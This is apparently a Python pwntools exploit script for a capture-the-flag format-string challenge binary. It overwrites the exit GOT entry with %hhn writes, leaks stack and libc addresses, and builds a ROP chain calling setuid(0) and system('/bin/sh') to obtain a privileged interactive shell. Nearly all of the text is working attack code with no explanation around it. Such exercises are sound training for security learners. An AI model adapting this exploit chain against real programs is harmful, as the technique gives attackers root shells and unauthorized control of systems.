from pwn import * 


binary = './babyfmt_level10.0_patched'
libc = ELF('./libc.so.6')
p = process(binary)

s = '''
b * printf
b * func+449
'''

def arw(target, dest, num_bytes, payload, param_pos):
	dest_bytes = [0] * num_bytes
	for i in range(num_bytes):
		dest_bytes[i] = (dest >> (i * 8)) & 0xff
		print(hex(dest_bytes[i]))

	
	printed = len(payload) + 0x6c     


	for i, byte in enumerate(dest_bytes):

		if byte < printed % 256:
			padding = 256 + byte - (printed % 256)
		else:
			padding = byte - (printed % 256)

		if padding != 0: 
			payload += f"%{padding}c".encode()
			printed += padding
	    
	    
		payload += f"%{param_pos + i}$hhn".encode()


	target = [target + i for i in range(num_bytes)]
	for addr in target:
		payload += p64(addr)
	
	p.sendline(payload)
	
	
	
	
	
	
	
	
	
	
	
	
	
def fmt_payload(dest, num_bytes, payload, param_pos, printed):
	dest_bytes = [0] * num_bytes
	for i in range(num_bytes):
		dest_bytes[i] = (dest >> (i * 8)) & 0xff
		print(hex(dest_bytes[i]))


	for i, byte in enumerate(dest_bytes):

		if byte < printed % 256:
			padding = 256 + byte - (printed % 256)
		else:
			padding = byte - (printed % 256)

		if padding != 0: 
			payload += f"%{padding}c".encode()
			printed += padding #printed is being changed
	    
	    
		payload += f"%{param_pos + i}$hhn".encode()

	return payload, printed # since it's being changed, we need to pass it to the next payload


payload = b"---"
arw(0x404068, 0x00000000004014c0, 3, payload, 50) # exit ---> func


p.clean() # clean the output of the previous payload (arw), so that recvuntil("Your input...") listens to new payload




payload_leak = b"%164$p\n%13$p"
p.sendline(payload_leak)



p.recvuntil("Your input is:                                                                                             \n")

leak = p.recvline().strip().decode()
old_rbp = int(leak, 16) # address in str
rsp = old_rbp - 0xef8

print("rsp: ", rsp)


leak = p.recvline().strip().decode()
libc_leak = int(leak, 16)

libc_base = libc_leak - 0x1f25e0
print("libc base: ", hex(libc_base))



'''
	pop_rdi,
	0,
	libc_base + libc.sym['setuid'],
	ret,
	pop_rdi,
	bin_sh_addr,
	ret,
	libc_base + libc.sym['system']
'''



# essential addresses
setuid = libc_base + libc.sym['setuid']
system = libc_base + libc.sym['system']
bin_sh_addr = libc_base + 0x1b45bd
print("setuid :", hex(setuid))
print("system :", hex(system))
# gadgets
ret = 0x000000000040101a
pop_rdi = 0x00000000004018a3


# writing the super long fmt_string
payload = b"--------------"
printed = len(payload) + 0x6c 

payload, printed = fmt_payload(pop_rdi, 3, payload, 102, printed) # preparing pop rdi
payload, printed = fmt_payload(0, 8, payload, 105, printed) # preparing 0
payload, printed = fmt_payload(setuid, 6, payload, 113, printed) 
payload, printed = fmt_payload(ret, 3, payload, 119, printed) 
payload, printed = fmt_payload(pop_rdi, 3, payload, 122, printed) 
payload, printed = fmt_payload(bin_sh_addr, 6, payload, 125, printed)
payload, printed = fmt_payload(ret, 3, payload, 131, printed)
payload, printed = fmt_payload(system, 6, payload, 134, printed)

target = rsp
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(8):
	payload += p64(target + i)
	
target += 8
for i in range(6):
	payload += p64(target + i)
	
target += 8
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(6):
	payload += p64(target + i)

target += 8
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(6):
	payload += p64(target + i)


#gdb.attach(p, s)
p.sendline(payload)

p.interactive()








